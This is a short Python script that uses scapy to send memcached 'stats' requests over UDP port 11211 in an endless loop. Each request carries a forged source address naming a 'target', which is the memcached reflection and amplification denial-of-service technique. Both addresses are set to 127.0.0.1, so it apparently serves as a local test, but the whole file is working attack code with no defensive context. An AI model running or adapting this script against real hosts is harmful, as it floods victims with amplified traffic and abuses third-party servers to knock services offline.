from time import sleep

from scapy.all import *
from scapy.layers.inet import IP, UDP, ICMP

target = "127.0.0.1"
memcached_server = "127.0.0.1"

if __name__ == '__main__':
    payload = '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
    while True:
        # send(IP(dst="127.0.0.1") / ICMP())
        sleep(1)
        send(IP(src=target, dst=memcached_server) / UDP(sport=80, dport=11211) / Raw(load=payload), count=100,
             verbose=0)
